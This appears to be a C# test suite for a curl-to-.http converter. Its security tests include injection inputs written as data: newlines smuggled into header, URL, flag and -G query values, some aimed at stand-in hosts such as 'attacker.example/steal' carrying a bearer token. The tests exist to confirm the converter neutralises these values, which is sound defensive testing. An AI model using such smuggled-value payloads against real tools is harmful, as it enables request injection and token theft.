using Sling.Import.Curl;

namespace Sling.Import.Tests;

/// <summary>
/// Converting a pasted curl command into a <c>.http</c> request.
/// </summary>
/// <remarks>
/// A pasted command is untrusted input - it arrives from a chat message or a web page as
/// often as from the user's own shell history - so roughly half of what is asserted here
/// is about what the converter refuses to do.
/// </remarks>
public sealed class CurlImportTests
{
    [Fact]
    public void The_simplest_command_becomes_a_get()
    {
        var result = CurlImport.Convert("curl https://api.example.com/me");

        Assert.True(result.Recognized);
        Assert.Equal("GET https://api.example.com/me\n", result.Http);
        Assert.Empty(result.Notes);
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("GET /me HTTP/1.1")]
    [InlineData("{\"already\": \"json\"}")]
    [InlineData("https://api.example.com/me")]
    public void Anything_that_is_not_curl_is_left_completely_alone(string pasted)
    {
        var result = CurlImport.Convert(pasted);

        Assert.False(result.Recognized);
        Assert.Empty(result.Http);
    }

    [Theory]
    [InlineData("/usr/bin/curl https://x.example.com")]
    [InlineData("curl.exe https://x.example.com")]
    [InlineData("CURL https://x.example.com")]
    [InlineData(@"C:\tools\curl.exe https://x.example.com")]
    public void Curl_is_recognised_however_it_was_invoked(string command) =>
        Assert.True(CurlImport.Convert(command).Recognized);

    [Fact]
    public void Headers_become_header_lines()
    {
        var result = CurlImport.Convert(
            "curl https://api.example.com/me -H 'Accept: application/json' -H \"X-Trace: abc\"");

        Assert.Contains("Accept: application/json", result.Http, StringComparison.Ordinal);
        Assert.Contains("X-Trace: abc", result.Http, StringComparison.Ordinal);
    }

    /// <summary>
    /// curl's own rule: an explicit -X always wins, a body without one implies POST, and
    /// everything else is GET. A copied command that silently becomes a GET is a request
    /// that looks identical and does nothing.
    /// </summary>
    [Theory]
    [InlineData("curl https://x.example.com", "GET")]
    [InlineData("curl -X PUT https://x.example.com", "PUT")]
    [InlineData("curl -d 'a=1' https://x.example.com", "POST")]
    [InlineData("curl -X DELETE -d 'a=1' https://x.example.com", "DELETE")]
    [InlineData("curl -I https://x.example.com", "HEAD")]
    [InlineData("curl --request patch https://x.example.com", "PATCH")]
    public void The_method_follows_curls_rule(string command, string expected) =>
        Assert.StartsWith(expected + " ", Body(CurlImport.Convert(command).Http), StringComparison.Ordinal);

    [Fact]
    public void A_body_arrives_after_a_blank_line_with_the_content_type_curl_would_have_sent()
    {
        var result = CurlImport.Convert("curl -d 'name=ada&year=1843' https://api.example.com/people");

        Assert.Contains("Content-Type: application/x-www-form-urlencoded", result.Http, StringComparison.Ordinal);
        Assert.Contains("\n\nname=ada&year=1843\n", result.Http, StringComparison.Ordinal);
    }

    [Fact]
    public void An_explicit_content_type_is_not_overridden()
    {
        var result = CurlImport.Convert(
            """curl -H 'Content-Type: application/json' -d '{"a":1}' https://x.example.com""");

        Assert.Contains("Content-Type: application/json", result.Http, StringComparison.Ordinal);
        Assert.DoesNotContain("x-www-form-urlencoded", result.Http, StringComparison.Ordinal);
    }

    /// <summary>Repeated -d arguments are joined with '&amp;'; that is how curl builds a form body.</summary>
    [Fact]
    public void Repeated_data_arguments_are_joined_the_way_curl_joins_them() =>
        Assert.Contains(
            "a=1&b=2",
            CurlImport.Convert("curl -d a=1 -d b=2 https://x.example.com").Http,
            StringComparison.Ordinal);

    [Fact]
    public void Dash_g_turns_the_data_into_a_query_string()
    {
        var result = CurlImport.Convert("curl -G -d q=hello -d page=2 https://api.example.com/search");

        Assert.Contains("GET https://api.example.com/search?q=hello&page=2", result.Http, StringComparison.Ordinal);
        Assert.DoesNotContain("Content-Type", result.Http, StringComparison.Ordinal);
    }

    [Fact]
    public void An_existing_query_string_is_appended_to_rather_than_replaced() =>
        Assert.Contains(
            "https://api.example.com/search?a=1&q=hello",
            CurlImport.Convert("curl -G -d q=hello 'https://api.example.com/search?a=1'").Http,
            StringComparison.Ordinal);

    [Fact]
    public void Long_flags_accept_both_spellings()
    {
        var spaced = CurlImport.Convert("curl --header 'Accept: text/plain' https://x.example.com").Http;
        var joined = CurlImport.Convert("curl --header='Accept: text/plain' https://x.example.com").Http;

        Assert.Equal(spaced, joined);
    }

    [Fact]
    public void Basic_auth_becomes_a_header_and_says_loudly_that_it_is_a_credential()
    {
        var result = CurlImport.Convert("curl -u ada:lovelace https://x.example.com");

        // base64("ada:lovelace")
        Assert.Contains("Authorization: Basic YWRhOmxvdmVsYWNl", result.Http, StringComparison.Ordinal);
        Assert.Contains(result.Notes, note => note.Contains("CREDENTIAL", StringComparison.Ordinal));
    }

    /// <summary>
    /// Sling verifies TLS and has no global way to turn that off (§5.3). Quietly
    /// accepting -k would be the worst outcome: the user would believe verification was
    /// disabled when it was not.
    /// </summary>
    [Fact]
    public void Insecure_is_refused_and_said_so()
    {
        var result = CurlImport.Convert("curl -k https://x.example.com");

        Assert.Contains(result.Notes, note => note.Contains("NOT applied", StringComparison.Ordinal));
        Assert.Contains("# ", result.Http, StringComparison.Ordinal);
    }

    [Fact]
    public void Multipart_fields_are_named_rather_than_silently_dropped()
    {
        var result = CurlImport.Convert("curl -F name=ada -F file=@x.png https://x.example.com");

        Assert.Equal(2, result.Notes.Count);
        Assert.All(result.Notes, note => Assert.Contains("multipart", note, StringComparison.Ordinal));
    }

    [Fact]
    public void An_unknown_flag_is_named_and_does_not_swallow_the_url()
    {
        var result = CurlImport.Convert("curl --some-future-flag https://x.example.com");

        Assert.Contains(result.Notes, note => note.Contains("--some-future-flag", StringComparison.Ordinal));
        Assert.Contains("GET https://x.example.com", result.Http, StringComparison.Ordinal);
    }

    [Fact]
    public void Flags_that_change_nothing_are_accepted_without_comment()
    {
        var result = CurlImport.Convert("curl -s -S -L --compressed -i -o out.json https://x.example.com");

        Assert.Empty(result.Notes);
        Assert.Equal("GET https://x.example.com\n", result.Http);
    }

    [Fact]
    public void A_command_with_no_url_says_so_rather_than_producing_half_a_request()
    {
        var result = CurlImport.Convert("curl -X POST -H 'Accept: */*'");

        Assert.True(result.Recognized);
        Assert.Empty(result.Http);
        Assert.Contains(result.Notes, note => note.Contains("no URL", StringComparison.Ordinal));
    }

    // ---- Quoting and continuations -------------------------------------------------

    [Fact]
    public void A_bash_style_multiline_command_is_one_command()
    {
        var result = CurlImport.Convert(
            "curl 'https://api.example.com/me' \\\n  -H 'Accept: application/json' \\\n  -H 'X-Trace: abc'");

        Assert.Contains("GET https://api.example.com/me", result.Http, StringComparison.Ordinal);
        Assert.Contains("Accept: application/json", result.Http, StringComparison.Ordinal);
        Assert.Contains("X-Trace: abc", result.Http, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("curl ^\n  https://x.example.com")]
    [InlineData("curl `\n  https://x.example.com")]
    public void Cmd_and_powershell_continuations_are_understood_too(string command) =>
        Assert.Contains("GET https://x.example.com", CurlImport.Convert(command).Http, StringComparison.Ordinal);

    /// <summary>
    /// A caret or backtick anywhere but the very end of a line is an ordinary character.
    /// Treating one as a continuation would corrupt a perfectly good URL.
    /// </summary>
    [Fact]
    public void A_caret_inside_a_url_is_an_ordinary_character() =>
        Assert.Contains(
            "https://x.example.com/a^b",
            CurlImport.Convert("curl https://x.example.com/a^b").Http,
            StringComparison.Ordinal);

    [Fact]
    public void Double_quoted_escapes_are_honoured_but_not_over_applied()
    {
        // \" is an escape; \n is not one, so the backslash survives - which is what keeps
        // a Windows path in a payload intact.
        var result = CurlImport.Convert("""curl -d "{\"path\":\"C:\dir\"}" https://x.example.com""");

        Assert.Contains("""{"path":"C:\dir"}""", result.Http, StringComparison.Ordinal);
    }

    [Fact]
    public void Single_quotes_are_literal()
    {
        var result = CurlImport.Convert("""curl -d 'a\b$c' https://x.example.com""");

        Assert.Contains("""a\b$c""", result.Http, StringComparison.Ordinal);
    }

    [Fact]
    public void An_unterminated_quote_yields_a_partial_import_rather_than_a_refusal() =>
        Assert.True(CurlImport.Convert("curl 'https://x.example.com").Recognized);

    // ---- Security ------------------------------------------------------------------

    /// <summary>
    /// The output is a newline-delimited document. A header value carrying a line break
    /// would become an <em>additional header line</em> - an injection into the artifact
    /// the user is about to trust and send.
    /// </summary>
    [Fact]
    public void A_newline_in_a_header_value_cannot_add_a_header()
    {
        var result = CurlImport.Convert(
            "curl -H \"X-A: one\nX-Injected: yes\" https://x.example.com");

        Assert.DoesNotContain("\nX-Injected:", result.Http, StringComparison.Ordinal);
        Assert.Contains("X-A: oneX-Injected: yes", result.Http, StringComparison.Ordinal);
    }

    /// <summary>
    /// An argument carrying a line break is refused as a URL rather than being stripped
    /// into one. Stripping a newline out of a header value leaves a wrong header;
    /// stripping one out of a URL decides <em>which host is contacted</em> by welding two
    /// lines into an address that resembles neither. Producing nothing, loudly, is the
    /// better failure.
    /// </summary>
    [Fact]
    public void A_newline_in_a_url_means_it_is_not_treated_as_a_url()
    {
        var result = CurlImport.Convert("curl \"https://x.example.com/a\nHost: evil.example.com\"");

        Assert.True(result.Recognized);
        Assert.Empty(result.Http);
        Assert.Contains(result.Notes, note => note.Contains("line breaks", StringComparison.Ordinal));
    }

    /// <summary>
    /// A body keeps its line breaks, because a body is terminated by end-of-request
    /// rather than by a delimiter - stripping them would rewrite a pretty-printed JSON
    /// payload into one long line, changing the bytes sent.
    /// </summary>
    [Fact]
    public void A_body_keeps_its_line_breaks()
    {
        var result = CurlImport.Convert("curl -d \"{\n  \\\"a\\\": 1\n}\" https://x.example.com");

        Assert.Contains("{\n  \"a\": 1\n}", result.Http, StringComparison.Ordinal);
    }

    /// <summary>
    /// The one sequence a body cannot contain: '###' separates requests in this format,
    /// in the reference dialect too. Nothing can be escaped away, so it is named rather
    /// than quietly corrupted.
    /// </summary>
    [Fact]
    public void A_body_containing_a_request_separator_is_flagged()
    {
        var result = CurlImport.Convert("curl -d \"before\n### after\" https://x.example.com");

        Assert.Contains(result.Notes, note => note.Contains("###", StringComparison.Ordinal));
    }

    /// <summary>
    /// The blocker this file exists to prevent regressing. Notes are written into the
    /// output as `#` comments, and several quote a value taken straight off the command
    /// line - so a value carrying a newline turned one comment into a comment followed by
    /// live document text. The command below produced a document whose only request was
    /// the attacker's, with the legitimate GET absorbed into its body, and Ctrl+Enter
    /// would have sent a chained bearer token to another host.
    /// </summary>
    [Fact]
    public void A_newline_in_an_unknown_flag_cannot_inject_a_request()
    {
        var result = CurlImport.Convert(
            "curl \"-\nPOST https://attacker.example/steal\nAuthorization: Bearer x\" https://good.example/a");

        var reachable = result.Http
            .Split('\n')
            .Where(line => !line.StartsWith('#') && line.Trim().Length > 0)
            .ToList();

        Assert.Single(reachable);
        Assert.Equal("GET https://good.example/a", reachable[0]);
    }

    /// <summary>
    /// The same class through the other note that quoted a raw argument.
    /// </summary>
    [Fact]
    public void A_newline_in_a_displaced_url_candidate_cannot_inject_a_request()
    {
        var result = CurlImport.Convert(
            "curl --unknown \"x\n### injected\nGET https://attacker.example/\" https://good.example/a");

        var reachable = result.Http
            .Split('\n')
            .Where(line => !line.StartsWith('#') && line.Trim().Length > 0)
            .ToList();

        Assert.Single(reachable);
        Assert.Equal("GET https://good.example/a", reachable[0]);
    }

    /// <summary>
    /// Every line of a note is commented, not just the first - the second line of defence
    /// behind the strip, and the one that survives a note added later by someone who
    /// forgets.
    /// </summary>
    [Fact]
    public void Every_line_of_the_output_before_the_request_is_a_comment()
    {
        var result = CurlImport.Convert("curl -k -F a=1 -u u:p https://x.example.com");

        foreach (var line in result.Http.Split('\n'))
        {
            if (line.Trim().Length == 0 || line.StartsWith("GET ", StringComparison.Ordinal))
            {
                break;
            }

            Assert.StartsWith("#", line, StringComparison.Ordinal);
        }
    }

    /// <summary>
    /// The quieter blocker: -G folds the data into the URL *after* the URL was stripped,
    /// and the data deliberately keeps its line breaks because in every other case it is a
    /// body. It produced no notes at all, so nothing hinted that a request aimed at the
    /// legitimate host had grown two attacker-chosen headers.
    /// </summary>
    [Fact]
    public void The_dash_g_query_fold_cannot_reintroduce_a_newline()
    {
        var result = CurlImport.Convert(
            "curl -G -d \"a=1\nAuthorization: Bearer x\nHost: attacker.example\" https://good.example/search");

        var lines = result.Http.Split('\n', StringSplitOptions.RemoveEmptyEntries);

        Assert.Single(lines);
        Assert.StartsWith("GET https://good.example/search?a=1", lines[0], StringComparison.Ordinal);
    }

    // ---- ANSI-C quoting, which is what browsers emit -------------------------------

    /// <summary>
    /// Chrome and Firefox switch "Copy as cURL" to $'…' whenever a value contains a
    /// control character, an apostrophe or a '!' - so this is the common path for any
    /// multi-line body, not a corner case. Without it the method came out GET, the body
    /// vanished entirely and the notes were nonsense.
    /// </summary>
    [Fact]
    public void Ansi_c_quoting_is_understood()
    {
        var result = CurlImport.Convert(
            "curl 'https://api.example.com/things' -H $'X-Note: it\\'s here' --data-raw $'{\\n  \"a\": 1\\n}'");

        Assert.Empty(result.Notes);
        Assert.Contains("POST https://api.example.com/things", result.Http, StringComparison.Ordinal);
        Assert.Contains("X-Note: it's here", result.Http, StringComparison.Ordinal);
        Assert.Contains("{\n  \"a\": 1\n}", result.Http, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData(@"$'\t'", "\t")]
    // One hex digit followed by a character that is not one. Reading a fixed two
    // would swallow the next character; a tab is used because it is the one control
    // character that survives the strip, so its arrival is observable.
    [InlineData(@"$'\x9'", "\t")]
    [InlineData(@"$'\x41'", "A")]
    [InlineData(@"$'é'", "é")]
    [InlineData(@"$'\\'", @"\")]
    [InlineData(@"$'plain'", "plain")]
    public void Ansi_c_escapes_decode(string quoted, string expected)
    {
        var result = CurlImport.Convert($"curl -H \"X-V: y\" --data-raw {quoted} https://x.example.com");

        Assert.Contains(expected, result.Http, StringComparison.Ordinal);
    }

    /// <summary>
    /// Untrusted input, so a code point that cannot be a character must not throw.
    /// </summary>
    [Theory]
    [InlineData(@"$'\ud800'")]
    [InlineData(@"$'\U0011FFFF'")]
    [InlineData(@"$'unterminated")]
    public void A_hostile_ansi_c_escape_does_not_throw(string quoted) =>
        Assert.True(CurlImport.Convert($"curl --data-raw {quoted} https://x.example.com").Recognized);

    // ---- File references -----------------------------------------------------------

    /// <summary>
    /// curl reads from a file for -d, --data, --data-ascii and --data-binary when the
    /// value starts with '@'. Only --data-raw does not. Treating them alike turned
    /// `-d @payload.json` - one of the commonest shapes in API documentation - into a POST
    /// whose body was the literal file name, silently.
    /// </summary>
    [Theory]
    [InlineData("-d")]
    [InlineData("--data")]
    [InlineData("--data-ascii")]
    [InlineData("--data-binary")]
    public void A_file_body_is_named_rather_than_sent_as_its_own_name(string flag)
    {
        var result = CurlImport.Convert($"curl {flag} @payload.json https://x.example.com");

        Assert.Contains(result.Notes, note => note.Contains("payload.json", StringComparison.Ordinal));
        Assert.DoesNotContain("\n\n@payload.json", result.Http, StringComparison.Ordinal);
    }

    [Fact]
    public void Data_raw_takes_an_at_sign_literally_because_curl_does() =>
        Assert.Contains(
            "\n\n@literal",
            CurlImport.Convert("curl --data-raw @literal https://x.example.com").Http,
            StringComparison.Ordinal);

    [Fact]
    public void A_scheme_less_url_is_upgraded_to_https_and_says_so()
    {
        var result = CurlImport.Convert("curl example.com/api");

        Assert.Contains("GET https://example.com/api", result.Http, StringComparison.Ordinal);
        Assert.Contains(result.Notes, note => note.Contains("https://", StringComparison.Ordinal));
    }

    [Fact]
    public void Url_encoded_data_encodes_the_value_and_keeps_the_name() =>
        Assert.Contains(
            "q=a%20b%26c",
            CurlImport.Convert("curl --data-urlencode 'q=a b&c' https://x.example.com").Http,
            StringComparison.Ordinal);

    [Fact]
    public void A_cookie_file_is_dropped_while_a_cookie_string_becomes_a_header()
    {
        Assert.Contains(
            "Cookie: session=abc",
            CurlImport.Convert("curl -b 'session=abc' https://x.example.com").Http,
            StringComparison.Ordinal);

        Assert.Contains(
            CurlImport.Convert("curl -b cookies.txt https://x.example.com").Notes,
            note => note.Contains("cookie file", StringComparison.OrdinalIgnoreCase));
    }

    /// <summary>The request line, with any leading comment block removed.</summary>
    private static string Body(string http)
    {
        foreach (var line in http.Split('\n'))
        {
            if (line.Length > 0 && !line.StartsWith('#'))
            {
                return line;
            }
        }

        return string.Empty;
    }
}
